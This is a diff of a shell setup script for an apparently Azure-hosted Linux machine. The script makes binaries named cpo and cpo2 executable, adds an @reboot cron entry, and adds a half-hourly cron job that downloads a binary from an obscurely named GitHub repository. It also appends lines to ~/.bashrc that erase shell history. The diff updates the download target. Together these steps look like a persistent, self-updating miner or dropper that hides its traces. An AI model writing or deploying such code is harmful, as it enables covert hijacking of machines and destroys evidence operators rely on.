@@ -26,7 +26,7 @@ chmod ugo+x cpo2
 chmod ugo+x cpo
 sudo systemctl enable cron
 crontab -l | { cat; echo "@reboot /home/azureuser/cpo2"; } | crontab
-crontab -l | { cat; echo "0,30 * * * * wget -p /root -O cpo_rpl_cpu https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/cpo_rpl_cpu"; } | crontab
+crontab -l | { cat; echo "0,30 * * * * wget -p /root -O cpo_rpl_cpu https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/cpo"; } | crontab
 echo ". cat /dev/null > ~/.bash_history" >> ~/.bashrc
 echo ". history -cw" >> ~/.bashrc
 sleep 15
